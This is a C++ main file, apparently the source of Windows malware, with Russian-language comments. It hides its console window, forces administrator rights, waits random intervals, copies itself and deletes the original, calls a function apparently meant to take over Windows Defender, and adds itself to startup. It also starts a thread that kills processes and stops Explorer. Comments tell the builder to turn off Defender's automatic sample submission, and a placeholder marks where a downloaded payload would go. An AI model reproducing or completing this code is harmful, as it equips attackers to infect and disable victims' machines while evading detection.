#include "func.h"
#include "include.h"
#include "threads.h"
using namespace std;
// g++ main.cpp -static -static-libgcc -static-libstdc++ -lgdi32 -o my_program.exe

// main execution of code parts depends on location and other conditions on the infected device
// СЕЙЧАС ЭТО В ДЕТЕКТЕ В WINDEFENDER
// 3213
// !!ВАЖНО!!
// ЕСЛИ У ТЕБЯ WINDOWS
// КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ НА ТВОЕМ ПК И НА ВИРТУАЛКЕ
// ЧТОБЫ ОТКЛЮЧИТЬ ОТПРАВКУ: Защита от вирусов и угроз - параметры защиты от вирусов и других угроз - управление настройками - автоотправка образцов отключить
int main(int argc, char* argv[]) {
    HWND Console;
    Console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Console, 0);
    char path[MAX_PATH];
    if (!isUserAdmin()) {
        restartAsAdmin();
        return 0;
    }
    Sleep(rand() % 5000 + 5000);
    if (copyAndRunSelf()) {
        deleteSelf();
        return 0;
    }
    if (!checkAndCreateFile("lafkildatnn.dat")) {
        Sleep(rand() % 5000 + 5000);
        DefenderOwner(); // возможно както переработать ?
        addToStartup();
        restartSystem();
        return 0;
    }
    std::thread killerThread(StopAllShit); // Запускаем фоновый поток
    killerThread.detach();
    stopExplorer();
    Sleep(rand() % 5000 + 5000);
    MessageBox(NULL, "Your crypt here!", "CrashHandler", MB_ICONERROR | MB_OK);;
    // тут функция скачивания файла с локальной сети либо же по ссылке, ссылка в приоритете ( нужно выбрать
    getchar();
    
    return 0;
}